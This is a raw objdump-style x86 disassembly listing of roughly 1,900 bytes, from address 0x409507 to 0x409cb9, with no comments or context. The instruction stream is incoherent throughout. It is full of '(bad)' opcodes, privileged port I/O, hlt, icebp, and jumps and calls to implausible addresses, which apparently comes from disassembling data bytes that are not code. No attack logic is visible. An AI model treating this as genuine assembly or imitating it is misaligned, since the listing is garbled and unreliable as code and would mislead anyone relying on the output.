  409507:	xchg   BYTE PTR [ebx+eax*1],al
  40950a:	push   0x6e43870c
  40950f:	fnstsw WORD PTR [edx-0x1280e033]
  409515:	jns    0x40956b
  409517:	xchg   DWORD PTR [bp+di+0xf],esi
  40951b:	cmp    al,0xce
  40951d:	out    0xd6,al
  40951f:	sub    DWORD PTR [esi+0x5b],eax
  409522:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409523:	adc    BYTE PTR [ecx-0x48],dl
  409526:	das    
  409527:	mov    esi,0x82000aa7
  40952c:	xor    BYTE PTR [ebx-0x3f191c40],0xbc
  409533:	push   ebp
  409534:	add    DWORD PTR [ebp-0x6bb3a156],ebx
  40953a:	add    esp,eax
  40953c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40953d:	pop    es
  40953e:	(bad)  
  40953f:	in     al,0x48
  409541:	cmp    ebp,DWORD PTR [edi-0x6cb7d140]
  409547:	add    eax,0xca63c78c
  40954c:	mov    dl,0x5c
  40954e:	data16 sahf 
  409550:	mov    al,0x7f
  409552:	inc    esp
  409553:	in     eax,dx
  409554:	mov    ebp,0x381f923
  409559:	shl    cl,0x78
  40955c:	call   DWORD PTR [ecx-0x20]
  40955f:	rcl    DWORD PTR [esi],cl
  409561:	imul   ebp,DWORD PTR ds:[ebp+0x396365fd],0xd8f8515d
  40956c:	sub    ebx,DWORD PTR [edi]
  40956e:	in     al,dx
  40956f:	jns    0x4095bc
  409571:	hlt    
  409572:	jnp    0x4095b5
  409574:	cmc    
  409575:	lods   eax,DWORD PTR ds:[esi]
  409576:	icebp  
  409577:	mov    eax,ds:0x7d26e91e
  40957c:	or     al,0x8d
  40957e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40957f:	sub    al,0xb
  409581:	mov    dl,0xb9
  409583:	jae    0x409563
  409585:	cmp    DWORD PTR [ebp-0x7913c6f1],eax
  40958b:	mov    ds:0x928a2928,al
  409590:	push   edx
  409591:	fwait
  409592:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409593:	jmp    0xde3fac2e
  409598:	cmc    
  409599:	(bad)  
  40959b:	ss ret 0x925a
  40959f:	mov    BYTE PTR [eax+eiz*4+0x52],0x4a
  4095a4:	push   cs
  4095a5:	mov    BYTE PTR [edi],0xec
  4095a8:	pop    ds
  4095a9:	pop    edx
  4095aa:	sub    al,0xa
  4095ac:	jmp    0x711959e
  4095b1:	add    DWORD PTR [ebx+0x54ad0051],0x32
  4095b8:	call   0x946a264
  4095bd:	in     eax,dx
  4095be:	mov    dh,0xe4
  4095c0:	jo     0x409568
  4095c2:	pop    ecx
  4095c3:	out    dx,al
  4095c4:	lea    ebx,[ebx]
  4095c6:	imul   eax,ecx,0x7d5e1db1
  4095cc:	scas   eax,DWORD PTR es:[edi]
  4095cd:	jbe    0x4095a5
  4095cf:	call   0x73a2f34c
  4095d4:	daa    
  4095d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095d6:	hlt    
  4095d7:	dec    ebp
  4095d8:	mov    dh,0x10
  4095da:	cmp    DWORD PTR [ecx],ecx
  4095dc:	xchg   edi,eax
  4095dd:	mov    ds,WORD PTR [ebp-0x3b]
  4095e0:	add    ah,BYTE PTR [edx+0xa986d7b]
  4095e6:	(bad)  
  4095e7:	cmp    edi,DWORD PTR [eax+0xf9c2f2]
  4095ed:	mov    dl,0x82
  4095ef:	retf   0x69e1
  4095f2:	xor    al,0x18
  4095f4:	jmp    0xd2173be3
  4095f9:	inc    ebp
  4095fa:	fcom   DWORD PTR [ebx]
  4095fc:	mov    esi,0x3719f3e4
  409601:	scas   al,BYTE PTR es:[edi]
  409602:	jl     0x4095a3
  409604:	xchg   ebx,eax
  409605:	pop    ebx
  409606:	sub    BYTE PTR [ebp+0x34a5adcd],0xdf
  40960d:	push   ebp
  40960e:	mov    eax,ds:0x55d750be
  409613:	popf   
  409614:	fcmovnb st,st(5)
  409616:	inc    esp
  409617:	call   0x1326:0x4cdbdbdb
  40961e:	(bad)  
  40961f:	call   0xaea175cf
  409624:	cmp    edi,DWORD PTR [esi+esi*8]
  409627:	fdivr  st,st(3)
  409629:	sbb    BYTE PTR [ebp-0x63],ch
  40962c:	fs mov ah,0x79
  40962f:	add    ah,BYTE PTR [ebp+0x44fdfad2]
  409635:	xor    eax,0x4c4ad550
  40963a:	test   DWORD PTR ds:0xa3d9114b,0xc5daccaa
  409644:	nop
  409645:	loopne 0x4096a1
  409647:	push   ds
  409648:	add    BYTE PTR [esi],0x61
  40964b:	or     bl,dl
  40964d:	mov    DWORD PTR [esi+0x2c],esi
  409650:	mov    eax,ds:0x39e12681
  409655:	xchg   esp,eax
  409656:	push   edx
  409657:	push   ebp
  409658:	adc    dl,al
  40965a:	or     al,BYTE PTR [eax]
  40965c:	cmp    BYTE PTR [esi+edi*4-0x15],bl
  409660:	ja     0x409690
  409662:	out    dx,eax
  409663:	sub    al,BYTE PTR [eax]
  409665:	in     al,dx
  409666:	out    dx,eax
  409667:	out    dx,eax
  409668:	jbe    0x4095ef
  40966a:	adc    BYTE PTR [edi+0x8],cl
  40966d:	sar    DWORD PTR [ebx-0x53],0xe5
  409671:	push   ecx
  409672:	add    DWORD PTR [edi-0x6d0325d0],ebx
  409678:	(bad)
  40967b:	sub    ch,BYTE PTR [edi+0x63]
  40967e:	inc    edi
  40967f:	pop    esi
  409680:	add    al,0x0
  409682:	jne    0x4096e4
  409684:	add    dl,ah
  409686:	adc    BYTE PTR [eax-0x7f0d4cf4],dl
  40968c:	shl    DWORD PTR ds:0xeb44bcf9,1
  409692:	add    ah,BYTE PTR [ebx-0x74]
  409695:	ja     0x4096e9
  409697:	imul   ebx,DWORD PTR [edi-0x5a2e594b],0x42f5ff76
  4096a1:	jmp    0x95996efd
  4096a6:	sbb    BYTE PTR [ebx+0x30],ah
  4096a9:	pop    edx
  4096aa:	mov    ds:0xa77692cb,eax
  4096af:	push   ebx
  4096b0:	jae    0x4096f2
  4096b2:	test   eax,0xd6fb7144
  4096b7:	push   ds
  4096b8:	sti    
  4096b9:	jnp    0x409685
  4096bb:	(bad)  
  4096bc:	inc    BYTE PTR [ebp-0x3f16b705]
  4096c2:	ret    
  4096c3:	sub    al,0x5a
  4096c5:	xchg   edi,eax
  4096c6:	dec    edx
  4096c7:	and    al,0xbd
  4096c9:	pop    esi
  4096ca:	ret    0xd868
  4096cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096ce:	(bad)  
  4096d0:	fstp   DWORD PTR [edi]
  4096d2:	xchg   edi,eax
  4096d3:	into   
  4096d4:	sbb    DWORD PTR [eax-0x3dc0f3ec],edi
  4096da:	mov    dl,0x8c
  4096dc:	popf   
  4096dd:	xor    DWORD PTR ds:0xb68d809f,0xacf55235
  4096e7:	aas    
  4096e8:	push   edi
  4096e9:	fcom   QWORD PTR [edx+0x4089302b]
  4096ef:	mov    eax,ds:0xa6a01ec6
  4096f4:	in     al,0xab
  4096f6:	int3   
  4096f7:	or     eax,0xba6a861
  4096fc:	repz mov esi,0x450c6d00
  409702:	sub    ecx,ecx
  409704:	jb     0x4096d1
  409706:	sub    al,0xb
  409708:	and    eax,DWORD PTR [ebx]
  40970a:	sub    eax,0x860477b9
  40970f:	ss sub al,0x1a
  409712:	pop    eax
  409713:	push   ebx
  409714:	mov    cl,0x2
  409716:	jmp    0x40978a
  409718:	cld    
  409719:	das    
  40971a:	mov    esp,0x36a73cf1
  40971f:	addr16 pushf 
  409721:	fcomp  st(1)
  409723:	lods   al,BYTE PTR ds:[esi]
  409724:	int    0xe8
  409726:	adc    esp,DWORD PTR [ecx+ecx*1+0x10677104]
  40972d:	shl    DWORD PTR [ebp+0x6b],cl
  409730:	sub    eax,0xeb9ba1c3
  409735:	out    dx,eax
  409736:	dec    edi
  409737:	sahf   
  409738:	stc    
  409739:	xor    ebp,DWORD PTR [esi-0x14]
  40973c:	push   ss
  40973d:	cmp    al,0xf2
  40973f:	ficomp WORD PTR [edi+0x14eb7364]
  409745:	pop    ebx
  409746:	pop    ebx
  409747:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409748:	push   0xa295bbb5
  40974d:	scas   al,BYTE PTR es:[edi]
  40974e:	lods   al,BYTE PTR ds:[esi]
  40974f:	out    dx,al
  409750:	push   0x6b48d373
  409755:	mov    esi,0xe32838a2
  40975a:	scas   al,BYTE PTR es:[edi]
  40975b:	mov    ebp,0x663a0060
  409760:	add    dh,bl
  409762:	or     al,0x30
  409764:	cmp    ah,bl
  409766:	(bad)  
  409767:	into   
  409768:	nop
  409769:	and    al,0x4d
  40976b:	sub    edx,ecx
  40976d:	ins    BYTE PTR es:[edi],dx
  40976e:	leave  
  40976f:	add    al,0x8
  409771:	mov    DWORD PTR [eax-0x33],eax
  409774:	add    DWORD PTR [esi-0x2f],ecx
  409777:	retf   
  409778:	stc    
  409779:	shl    DWORD PTR [edi],1
  40977b:	add    esi,esi
  40977d:	div    DWORD PTR [edi+0x15]
  409780:	jo     0x40978c
  409782:	clc    
  409783:	add    eax,0x3e5893e0
  409788:	lods   eax,DWORD PTR gs:[esi]
  40978a:	jge    0x409758
  40978c:	pop    eax
  40978d:	(bad)  [edx-0x32]
  409790:	mov    ecx,0x888776c8
  409795:	loop   0x4097de
  409797:	and    DWORD PTR [ebx-0x4bf05138],edi
  40979d:	ds dec ecx
  40979f:	push   edx
  4097a0:	push   esp
  4097a1:	xchg   edx,eax
  4097a2:	add    dh,cl
  4097a4:	add    DWORD PTR [edi-0x669ae699],edx
  4097aa:	das    
  4097ab:	retf   0x6f1b
  4097ae:	jecxz  0x409747
  4097b0:	xchg   BYTE PTR [edi+ebp*1],bh
  4097b3:	enter  0x128b,0x1d
  4097b7:	inc    edx
  4097b8:	jg     0x4097b8
  4097ba:	ins    DWORD PTR es:[edi],dx
  4097bb:	mov    ebx,0x8fa75446
  4097c0:	int    0x91
  4097c2:	pop    eax
  4097c3:	mov    al,0x50
  4097c5:	cdq    
  4097c6:	cmp    al,0xcf
  4097c8:	sub    DWORD PTR [edx-0x2bdd4afe],ecx
  4097ce:	je     0x4097b5
  4097d0:	jmp    0x614:0x6dc7f64d
  4097d7:	add    eax,0x6f784a24
  4097dc:	ja     0x4097a6
  4097de:	sub    eax,0x67026cf0
  4097e3:	push   es
  4097e4:	ins    BYTE PTR es:[edi],dx
  4097e5:	push   cs
  4097e6:	pop    ebp
  4097e7:	(bad)  
  4097e8:	shr    BYTE PTR [ebp-0x64a5e625],1
  4097ee:	test   edx,ebp
  4097f0:	das    
  4097f1:	sub    DWORD PTR [ebp-0x2c],esi
  4097f4:	jecxz  0x409800
  4097f6:	scas   eax,DWORD PTR es:[edi]
  4097f7:	ins    BYTE PTR es:[edi],dx
  4097f8:	mov    ch,0x9c
  4097fa:	add    eax,0xb016220c
  409800:	fs iret 
  409802:	(bad)  
  409803:	or     DWORD PTR [ecx+edx*8],edi
  409806:	xchg   esp,eax
  409807:	loope  0x40981e
  409809:	fwait
  40980a:	push   0xce891686
  40980f:	pop    ss
  409810:	add    eax,DWORD PTR [edi+edi*4+0x4113259d]
  409817:	js     0x409825
  409819:	jo     0x40980c
  40981b:	(bad)  
  40981c:	mov    esp,0x9873cc30
  409821:	into   
  409822:	or     eax,0xe7cc39f3
  409827:	xchg   edx,eax
  409828:	mov    esp,0x29402c70
  40982d:	push   edi
  40982e:	dec    esi
  40982f:	test   BYTE PTR [ecx],bl
  409831:	xor    DWORD PTR [ebx+0x73fa0e4a],esp
  409837:	cmc    
  409838:	shr    BYTE PTR [ebx-0x3b1f23dc],cl
  40983e:	into   
  40983f:	fldcw  WORD PTR [edx+0x7d6937f1]
  409845:	in     al,dx
  409846:	and    BYTE PTR [ebx+0x4e],ch
  409849:	xchg   ebp,eax
  40984a:	adc    eax,0x3060f903
  40984f:	mov    al,ds:0xd5f0e9d3
  409854:	scas   eax,DWORD PTR es:[edi]
  409855:	cmp    eax,0x6fe7abc7
  40985a:	repz shl BYTE PTR [ebx],0x1f
  40985e:	fs imul edi,ebx,0xc
  409862:	mov    ds:0x1da453ed,eax
  409867:	mov    bh,0xe8
  409869:	addr16 jne 0x4098c8
  40986c:	clc    
  40986d:	shl    DWORD PTR [edx+eax*2],cl
  409870:	sub    eax,DWORD PTR [esi+eax*4+0x72]
  409874:	mov    edx,DWORD PTR [ecx+edx*4-0x26]
  409878:	cmp    DWORD PTR [edx-0x2c298cb],eax
  40987e:	scas   eax,DWORD PTR es:[edi]
  40987f:	inc    esi
  409880:	add    BYTE PTR [edx-0x6],bh
  409883:	pop    edi
  409884:	adc    al,0x90
  409886:	cwde   
  409887:	or     DWORD PTR [ebx+0x1e3bcb5e],eax
  40988d:	pop    ss
  40988e:	int3   
  40988f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409890:	stc    
  409891:	jl     0x409826
  409893:	leave  
  409894:	fs push ebp
  409896:	js     0x4098cb
  409898:	pop    es
  409899:	out    dx,al
  40989a:	fld    TBYTE PTR [edx+0x40]
  40989d:	mov    cl,0xbc
  40989f:	arpl   WORD PTR [eax],ax
  4098a1:	sbb    BYTE PTR [edi-0xd29a509],cl
  4098a7:	pop    ecx
  4098a8:	pushf  
  4098a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098aa:	(bad)  
  4098ab:	jecxz  0x4098c3
  4098ad:	ds push 0x2f061dad
  4098b3:	cmp    eax,0xc671422c
  4098b8:	sbb    bh,dh
  4098ba:	loop   0x40985f
  4098bc:	sahf   
  4098bd:	fidivr WORD PTR [ecx]
  4098bf:	dec    esi
  4098c0:	mov    WORD PTR [ebx],gs
  4098c2:	arpl   WORD PTR [edi],dx
  4098c4:	mov    ah,0xbe
  4098c6:	xchg   ebp,eax
  4098c7:	mov    dh,0xdd
  4098c9:	inc    edx
  4098ca:	sbb    al,0xde
  4098cc:	jmp    0x7c8f3607
  4098d1:	mov    dh,cl
  4098d3:	push   esp
  4098d4:	pushf  
  4098d5:	rcr    BYTE PTR [eax+0x4b],cl
  4098d8:	pop    ecx
  4098d9:	xchg   esp,eax
  4098da:	fs pop ecx
  4098dc:	dec    esi
  4098dd:	mov    eax,ds:0xa1649fb5
  4098e2:	fisubr WORD PTR [eax]
  4098e4:	bound  ebp,QWORD PTR [edx+0x7f]
  4098e7:	dec    edi
  4098e8:	bound  ebx,QWORD PTR [ebp-0x12]
  4098eb:	jg     0x4098ff
  4098ed:	das    
  4098ee:	jp     0x40990f
  4098f0:	sub    DWORD PTR [ebx+0x26f9a65b],ecx
  4098f6:	pop    ecx
  4098f7:	rol    DWORD PTR [esi],1
  4098f9:	popa   
  4098fa:	push   ecx
  4098fb:	ret    0xa4a2
  4098fe:	inc    ebp
  4098ff:	dec    edx
  409900:	add    ebp,0xffffffd4
  409903:	pushf  
  409904:	nop
  409905:	add    BYTE PTR [edx],ch
  409907:	adc    DWORD PTR [edx+edi*1+0x9],esi
  40990b:	cmp    DWORD PTR [esi+0x42],0xffffffab
  40990f:	and    eax,0x81c6e799
  409914:	push   ebx
  409915:	(bad)  
  409916:	(bad)  
  409917:	aaa    
  409918:	add    DWORD PTR [eax-0x3a95413b],eax
  40991e:	loope  0x409975
  409920:	arpl   WORD PTR [ebx],ax
  409922:	les    ecx,FWORD PTR [edx]
  409924:	add    BYTE PTR [eax-0xb],ah
  409927:	mov    dh,0xda
  409929:	xor    eax,0xa26336fc
  40992e:	popa   
  40992f:	jnp    0x4098be
  409931:	jb     0x4098b4
  409933:	inc    edx
  409935:	add    ah,BYTE PTR [eax]
  409937:	inc    esp
  409938:	add    BYTE PTR fs:[esp+ecx*4+0xd561d40],0x76
  409941:	add    DWORD PTR [edx-0x2d35fd4e],0x52
  409948:	push   0x41
  40994a:	loop   0x4098f3
  40994c:	or     DWORD PTR [esi-0x1c2b4fba],edx
  409952:	or     bl,al
  409954:	mov    ebx,0xcb8a0975
  409959:	mov    esp,0xc4b3f1ef
  40995e:	dec    ecx
  40995f:	cmp    ebp,DWORD PTR [esi+0x58efdcfa]
  409965:	jmp    0xfdca1ecd
  40996a:	add    al,0xc1
  40996c:	sbb    ecx,DWORD PTR fs:[ebp-0x641c83ba]
  409973:	das    
  409974:	lock popf 
  409976:	xchg   edi,eax
  409977:	cs jno 0x40996c
  40997a:	in     al,dx
  40997b:	adc    ebx,DWORD PTR [eax+edi*1-0x2464ff0b]
  409982:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409983:	call   0x7d8120fe
  409988:	mov    esi,ebp
  40998a:	mov    al,ds:0x5afbcdb4
  40998f:	aad    0x4e
  409991:	mov    ah,0x6d
  409993:	adc    al,0xf3
  409995:	aas    
  409996:	bound  eax,QWORD PTR [edi]
  409998:	addr16 jo 0x40999d
  40999b:	xchg   cl,cl
  40999d:	inc    ecx
  40999e:	loop   0x409a05
  4099a0:	retf   
  4099a1:	mov    ch,0x81
  4099a3:	cs push ebx
  4099a5:	and    al,0xab
  4099a7:	xchg   DWORD PTR [eax],eax
  4099a9:	xchg   DWORD PTR [edi+0x2a],esp
  4099ac:	retf   
  4099ad:	xchg   edx,eax
  4099ae:	add    DWORD PTR [ebx-0x581faa7d],0xffffff81
  4099b5:	icebp  
  4099b6:	repnz popf 
  4099b8:	mov    ebp,0xdb7973
  4099bd:	push   eax
  4099be:	adc    al,0xf9
  4099c0:	xchg   esi,esp
  4099c2:	repz (bad) 
  4099c5:	add    eax,0x9295d7f1
  4099ca:	pop    ds
  4099cb:	dec    esi
  4099cc:	xchg   esp,eax
  4099cd:	jb     0x4099e2
  4099cf:	sbb    eax,0x3274c35a
  4099d4:	mov    eax,ds:0x6706ded0
  4099d9:	xor    DWORD PTR [esi+ecx*8+0x1b],0xa804c44f
  4099e1:	fisub  DWORD PTR [ebx-0x4766f5ae]
  4099e7:	popa   
  4099e8:	cdq    
  4099e9:	push   ss
  4099ea:	sub    bl,cl
  4099ec:	or     cl,0xf4
  4099ef:	shr    BYTE PTR [ebp+0x460d6ab8],1
  4099f5:	fwait
  4099f6:	or     dl,BYTE PTR [eax-0xe]
  4099f9:	mov    ds:0xf272cf24,al
  4099fe:	rcr    cl,cl
  409a00:	hlt    
  409a01:	mov    eax,ds:0xbfb39b42
  409a06:	fmul   QWORD PTR [ebx+0x2f6b6384]
  409a0c:	lds    ebx,FWORD PTR [edx-0x36]
  409a0f:	loopne 0x409a11
  409a11:	pop    esp
  409a12:	sbb    bh,dh
  409a14:	outs   dx,BYTE PTR ds:[esi]
  409a15:	sbb    BYTE PTR [eax-0x4b43a3cb],dh
  409a1b:	mov    edx,esi
  409a1d:	ins    DWORD PTR es:[edi],dx
  409a1e:	pop    edx
  409a1f:	ins    DWORD PTR es:[edi],dx
  409a20:	out    0xfc,eax
  409a22:	xchg   ebx,eax
  409a23:	dec    edx
  409a24:	loop   0x409a29
  409a26:	add    BYTE PTR [eax],bl
  409a28:	stos   DWORD PTR es:[edi],eax
  409a29:	std    
  409a2a:	jae    0x409a75
  409a2c:	rcr    BYTE PTR [ecx+0x64b69d05],0x63
  409a33:	nop
  409a34:	shr    ch,cl
  409a36:	sub    ah,BYTE PTR [esi-0x2b6598cd]
  409a3c:	pop    ecx
  409a3d:	ror    BYTE PTR [edx+0x3e57b5b5],0x46
  409a44:	fsubr  st(3),st
  409a46:	inc    edi
  409a47:	cs in  al,dx
  409a49:	push   ebp
  409a4a:	sub    al,0x20
  409a4c:	out    0xd9,al
  409a4e:	push   ebp
  409a4f:	cmp    al,0x1f
  409a51:	push   ss
  409a52:	cdq    
  409a53:	or     DWORD PTR [ebp+0x2df35fd6],0x889702ac
  409a5d:	pop    ecx
  409a5e:	clc    
  409a5f:	in     eax,dx
  409a60:	(bad)  
  409a61:	jp     0x4099f2
  409a63:	ja     0x409ac6
  409a65:	cmp    eax,0x85149013
  409a6a:	dec    ebx
  409a6b:	or     edx,esi
  409a6d:	(bad)  
  409a6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a6f:	push   ebx
  409a70:	dec    ebx
  409a71:	mov    ecx,0x6407fc22
  409a76:	mov    bl,0x9
  409a78:	mov    bh,0xae
  409a7a:	jge    0x409a13
  409a7c:	daa    
  409a7d:	pop    ds
  409a7e:	jmp    0x409a51
  409a80:	push   0xffffffb5
  409a82:	enter  0xacb2,0x9a
  409a86:	enter  0x7833,0xf2
  409a8a:	jecxz  0x409a6a
  409a8c:	ds mov esp,0x102a38df
  409a92:	ficom  WORD PTR [edi-0x66]
  409a95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a96:	mov    WORD PTR [esi+0x23],es
  409a99:	pop    esi
  409a9a:	cli    
  409a9b:	(bad)  
  409a9c:	stos   DWORD PTR es:[edi],eax
  409a9d:	jl     0x409a8c
  409a9f:	mov    ecx,0xf5b1b3ef
  409aa4:	adc    BYTE PTR [edi],ah
  409aa6:	dec    edi
  409aa7:	cmp    eax,0x69f6d6c4
  409aac:	push   es
  409aad:	sbb    ebx,DWORD PTR [ebx-0x80]
  409ab0:	je     0x409a3c
  409ab2:	fst    DWORD PTR [esi+esi*8+0x66]
  409ab6:	cmc    
  409ab7:	(bad)  
  409ab8:	aad    0xb5
  409aba:	mov    edx,0x22fabf6
  409abf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ac0:	xchg   ebp,eax
  409ac1:	mov    cl,0x18
  409ac3:	jecxz  0x409a7b
  409ac5:	push   ebp
  409ac6:	data16 or BYTE PTR ds:0xba5b934b,0x69
  409ace:	rol    esi,0x46
  409ad1:	scas   eax,DWORD PTR es:[edi]
  409ad2:	mov    dl,0xff
  409ad4:	push   edi
  409ad5:	or     eax,0xd6d6b607
  409ada:	out    0x35,al
  409adc:	mov    edx,ds
  409ade:	jb     0x409aa9
  409ae0:	(bad)
  409ae4:	hlt    
  409ae5:	dec    edi
  409ae6:	push   esp
  409ae8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ae9:	aas    
  409aea:	(bad)  
  409aeb:	icebp  
  409aec:	(bad)  
  409aed:	dec    edi
  409aef:	(bad)  
  409af0:	call   0xc0249814
  409af5:	xor    bl,BYTE PTR [ebp+0x1ee0bb4e]
  409afb:	pusha  
  409afc:	xor    BYTE PTR [eax],bl
  409afe:	jo     0x409afa
  409b00:	hlt    
  409b01:	imul   ebx,esi,0xf9c7defb
  409b07:	hlt    
  409b08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b09:	push   DWORD PTR [edx]
  409b0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b0c:	dec    esi
  409b0d:	popf   
  409b0e:	and    al,0xcb
  409b10:	xor    cl,BYTE PTR [esi]
  409b12:	div    BYTE PTR [esi+0x29]
  409b15:	retf   0xeab2
  409b18:	stc    
  409b19:	shr    DWORD PTR [ecx],0x7b
  409b1c:	xchg   edx,eax
  409b1d:	mov    dh,0x5c
  409b1f:	adc    cl,BYTE PTR [esi]
  409b21:	cs mov cl,0x46
  409b24:	jmp    0x409ab8
  409b26:	and    cl,bl
  409b28:	cwde   
  409b29:	xchg   ebp,eax
  409b2a:	push   ebx
  409b2b:	mov    ecx,ss
  409b2d:	ds cmp al,0xe7
  409b30:	(bad)  
  409b31:	iretw  
  409b33:	repnz cmp BYTE PTR [edi+ecx*8],0x31
  409b38:	(bad)  
  409b39:	iret   
  409b3a:	dec    ebx
  409b3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b3c:	retf   
  409b3d:	or     cl,ch
  409b3f:	fwait
  409b40:	push   ds
  409b41:	jecxz  0x409ae6
  409b43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b44:	test   eax,0xb850abe8
  409b49:	sub    cl,BYTE PTR [ebx]
  409b4b:	dec    esp
  409b4c:	addr16 mov bl,0x25
  409b4f:	inc    edi
  409b50:	mov    WORD PTR [edx+eax*4+0x74b9ccb2],ss
  409b57:	jns    0x409b63
  409b59:	ins    BYTE PTR es:[edi],dx
  409b5a:	and    ah,BYTE PTR [ebp-0x3dac0135]
  409b60:	(bad)  
  409b61:	in     al,dx
  409b62:	stos   BYTE PTR es:[edi],al
  409b63:	jl     0x409b7c
  409b65:	pop    esi
  409b66:	jns    0x409bd8
  409b68:	dec    esi
  409b69:	int3   
  409b6a:	xor    al,0x15
  409b6c:	ins    BYTE PTR es:[edi],dx
  409b6d:	or     al,0x24
  409b6f:	fwait
  409b70:	inc    ebx
  409b71:	leave  
  409b72:	je     0x409b5e
  409b74:	out    dx,al
  409b75:	pop    edi
  409b76:	imul   ecx,DWORD PTR [ebx],0x22
  409b79:	icebp  
  409b7a:	lea    ebp,[esi]
  409b7c:	sub    BYTE PTR [esp+ebx*8-0x6],bh
  409b80:	mov    esp,0xcb40d9f2
  409b85:	xor    eax,0xab00f5b5
  409b8a:	adc    eax,0xf5bd1a38
  409b8f:	push   edx
  409b90:	test   al,0x2f
  409b92:	into   
  409b93:	or     al,0x8c
  409b95:	dec    ebp
  409b96:	push   cs
  409b97:	jg     0x409b77
  409b99:	sbb    cl,BYTE PTR [ebx]
  409b9b:	mov    ch,cl
  409b9d:	xchg   DWORD PTR [eax-0x22],esi
  409ba0:	nop
  409ba1:	fs in  al,0xbf
  409ba4:	xchg   DWORD PTR [ebx-0x4e],edi
  409ba7:	push   cs
  409ba8:	or     al,0xb5
  409baa:	push   esi
  409bab:	outs   dx,BYTE PTR ds:[esi]
  409bac:	or     eax,0x9d30ccbc
  409bb1:	pop    ebx
  409bb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bb3:	cdq    
  409bb4:	and    ebx,ecx
  409bb6:	and    al,0xb9
  409bb8:	syscall 
  409bba:	or     ch,BYTE PTR [edx+edx*2]
  409bbd:	add    BYTE PTR [eax+0x54],0x69
  409bc1:	push   es
  409bc2:	(bad)  
  409bc3:	push   0x6e
  409bc5:	pop    esp
  409bc6:	stc    
  409bc7:	push   ds
  409bc8:	setg   BYTE PTR [ebp-0x4f]
  409bcc:	mov    cl,0xd1
  409bce:	scas   eax,DWORD PTR es:[edi]
  409bcf:	test   al,0x7f
  409bd1:	push   eax
  409bd2:	clc    
  409bd3:	mov    eax,0x7e958fc7
  409bd8:	push   ebp
  409bd9:	mov    eax,0xd6c5294f
  409bde:	(bad)  
  409bdf:	push   ss
  409be0:	pop    ss
  409be1:	das    
  409be2:	pop    esi
  409be3:	out    0xcb,al
  409be5:	pop    edi
  409be6:	jge    0x409b86
  409be8:	mov    ah,0x7b
  409bea:	mov    dl,bl
  409bec:	addr16 ffreep st(3)
  409bef:	(bad)  
  409bf0:	into   
  409bf1:	sbb    DWORD PTR [edx-0x3],edi
  409bf4:	sub    eax,0x50e855ac
  409bf9:	add    ecx,DWORD PTR ds:0x2834bf8a
  409bff:	sub    DWORD PTR [eax-0x5],edx
  409c02:	push   ebp
  409c03:	int    0xa2
  409c05:	inc    ecx
  409c06:	bound  eax,QWORD PTR [edx-0x71]
  409c09:	pop    edi
  409c0a:	mov    ecx,0x7363c02
  409c0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c10:	pop    edi
  409c11:	call   DWORD PTR gs:[edi-0x588fe792]
  409c18:	scas   eax,DWORD PTR es:[edi]
  409c19:	sbb    DWORD PTR [esi-0x22baeb7a],ecx
  409c1f:	adc    DWORD PTR [bp+di],ebp
  409c22:	jnp    0x409c75
  409c24:	adc    al,0x47
  409c26:	lods   eax,DWORD PTR ds:[esi]
  409c27:	add    eax,0xa3f0af0
  409c2c:	dec    esi
  409c2d:	ror    BYTE PTR [edi-0x405c0b82],0xa8
  409c34:	mov    ch,0xfe
  409c36:	ja     0x409c97
  409c38:	cld    
  409c39:	loop   0x409c52
  409c3b:	(bad)  [ecx+0x31]
  409c3e:	adc    DWORD PTR [esi-0x55],0xffffffc5
  409c42:	addr16 aas 
  409c44:	sti    
  409c45:	pop    ecx
  409c46:	scas   al,BYTE PTR es:[edi]
  409c47:	pop    ebp
  409c48:	mov    ebx,0xf0be17c6
  409c4d:	add    eax,0xebfc1084
  409c52:	jg     0x409c51
  409c54:	outs   dx,DWORD PTR ds:[esi]
  409c55:	clc    
  409c56:	int3   
  409c57:	addr16 ds ret 
  409c5a:	(bad)  
  409c5c:	sti    
  409c5d:	jg     0x409bfe
  409c5f:	jae    0x409c48
  409c61:	into   
  409c62:	jno    0x409c57
  409c64:	(bad)  
  409c65:	xor    eax,0xdab4d68c
  409c6a:	sbb    eax,0xb792e537
  409c6f:	in     eax,0xb3
  409c71:	stc    
  409c72:	mov    WORD PTR [ebx+ecx*8],?
  409c75:	mov    esp,0x766c1009
  409c7a:	inc    ebx
  409c7b:	test   eax,0x4679f30d
  409c80:	xchg   esi,eax
  409c81:	gs cs and edi,eax
  409c85:	fwait
  409c86:	adc    eax,DWORD PTR [edx+0x50]
  409c89:	imul   eax,DWORD PTR [eax],0x77
  409c8c:	xchg   edx,eax
  409c8d:	jnp    0x409ce0
  409c8f:	hlt    
  409c90:	push   ebp
  409c91:	add    DWORD PTR gs:[eax+esi*2-0x6db6bf37],edx
  409c99:	push   esp
  409c9a:	or     ah,BYTE PTR [edx-0x53]
  409c9d:	inc    ebp
  409c9e:	or     dh,BYTE PTR [edi+0x58c1f01a]
  409ca4:	popa   
  409ca5:	ins    DWORD PTR es:[edi],dx
  409ca6:	adc    BYTE PTR [eax+eiz*4],0x94
  409caa:	inc    esp
  409cab:	dec    edx
  409cac:	and    DWORD PTR [eax],0x76c0d650
  409cb2:	ror    BYTE PTR [edx],0xe7
  409cb5:	(bad)  
  409cb6:	nop
  409cb7:	add    bh,BYTE PTR [edx]
  409cb9:	in     eax,dx
